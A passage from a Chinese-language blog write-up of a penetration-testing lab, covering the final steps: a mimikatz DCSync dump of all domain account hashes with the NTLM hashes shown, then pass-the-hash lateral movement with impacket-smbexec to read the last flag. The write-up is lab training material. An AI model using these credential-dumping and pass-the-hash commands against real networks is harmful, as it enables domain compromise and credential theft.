<pre tabindex="0"><code>type c:\Users\Administrator\flag\flag02.txt
</code></pre><p><img alt="image-20250312204643818" loading="lazy" src="../assets/image-20250312204643818.png"></p>
<p>接着我们可以新建一个用户让rdp可以连上去</p>
<h3 id="flag3">FLAG3<a hidden class="anchor" aria-hidden="true" href="#flag3">#</a></h3>
<p>接下来就是常规的将域内用户的哈希dump下来</p>
<pre tabindex="0"><code>mimikatz.exe &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; exit &gt; mimikatz.txt
</code></pre><p>结果</p>
<pre tabindex="0"><code>
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] &#39;xiaorang.lab&#39; will be the domain
[DC] &#39;DC01.xiaorang.lab&#39; will be the DC server
[DC] Exporting domain &#39;xiaorang.lab&#39;
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	3ffd5b58b4a6328659a606c3ea6f9b63	514
1000	DC01$	7408967f1fd3c2ff807232b7b5c5fc95	532480
500	Administrator	2c9d81bdcf3ec8b1def10328a7cc2f08	512
1103	WIN2016$	aae3dca76f254c52708ee076935bb533	16781312
1104	WIN19-CLIENT$	7c011200ecbe666945e465c200afcb5e	16781312
1105	Aldrich	0607f770c2f37e09a850e09e920a9f45	512

mimikatz(commandline) # exit
Bye!
</code></pre><p>之后就可以进行横向移动了</p>
<pre tabindex="0"><code>proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk
</code></pre><p><img alt="image-20250312214445451" loading="lazy" src="../assets/image-20250312214445451.png"></p>
<pre tabindex="0"><code>type c:\users\administrator\flag\flag03.txt
</code></pre><p>拿到最后一个flag</p>
<pre tabindex="0"><code>C:\Windows\system32&gt;type c:\users\administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-&#39;
    | |   ( (`\] / /&#39;`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `&#39;.&#39;. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )&#39;.___.&#39;[___][___]&#39;.__.&#39;[___||__]\__/


Congratulations! ! !

flag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e}
</code></pre><p>这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/">
    <span class="title">« 上一页</span>
    <br>
    <span>春秋云镜-Initial-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ghctf_2025/">
    <span class="title">下一页 »</span>
    <br>
    <span>GHCTF-2025-Web-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
